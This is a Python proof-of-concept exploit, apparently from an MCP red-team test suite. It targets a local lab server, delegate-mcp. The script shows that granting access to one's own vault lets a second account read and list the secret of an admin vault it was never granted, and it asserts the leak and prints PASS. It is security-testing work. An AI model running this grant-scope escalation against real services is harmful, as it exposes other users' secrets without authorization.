"""Deterministic exploit proof for delegate-mcp (CWE-639 grant-scope leak).

PASS when delegating read access on YOUR OWN vault lets a second account you
control read admin_vault's secret (a vault it was never granted) - the exact
unknown-shape flaw no McPwn signal detects, in a different mechanism than
vault-mcp's substring match.

Steps:
  1. create_vault(owner=me, name=myvault, secret=...)   -> own vault
  2. grant_access(owner=me, name=myvault, delegate=me2)  -> me2 can read myvault
  3. read_vault(owner=me2, name=admin_vault)             -> BUG: leaks admin secret
  4. list_vaults(owner=me2)                              -> shows admin_vault too
"""

from __future__ import annotations

import argparse
import asyncio
import sys
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from mcp_redteam.targets.mcp_client import McpSession

DEFAULT_URL = "http://127.0.0.1:9206/sse"


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_URL)
    args = parser.parse_args()

    me = f"user-{uuid.uuid4().hex[:6]}"
    me2 = f"user-{uuid.uuid4().hex[:6]}"
    name = f"myvault-{uuid.uuid4().hex[:6]}"
    secret = f"s3cr3t-{uuid.uuid4().hex[:8]}"
    async with McpSession(args.url) as s:
        r = await s.call_tool("create_vault", {"owner": me, "name": name, "secret": secret})
        assert "created" in r.result_text, r.result_text

        # me2 (or anyone) has NO access to admin_vault before the grant.
        denied = await s.call_tool("read_vault", {"owner": me2, "name": "admin_vault"})
        assert "cannot read" in denied.result_text, f"expected denial, got {denied.result_text!r}"

        # Legitimate action: me delegates me2 on MY OWN vault.
        granted = await s.call_tool(
            "grant_access", {"owner": me, "name": name, "delegate": me2}
        )
        assert "granted" in granted.result_text, granted.result_text

        # BUG: the grant scoped to myvault leaked to admin_vault.
        leaked = await s.call_tool("read_vault", {"owner": me2, "name": "admin_vault"})
        assert leaked.result_text == "TOP-SECRET-ADMIN-VAULT-2026", (
            f"expected admin secret leak, got {leaked.result_text!r}"
        )
        listed = await s.call_tool("list_vaults", {"owner": me2})
        assert "admin_vault" in listed.result_text, listed.result_text
        print(f"PASS: delegate grant on {name!r} leaked admin_vault to {me2!r}")
        print(f"     read_vault({me2!r}, 'admin_vault') -> {leaked.result_text!r}")
        print(f"     list_vaults({me2!r}) -> {listed.result_text!r}")


if __name__ == "__main__":
    asyncio.run(main())
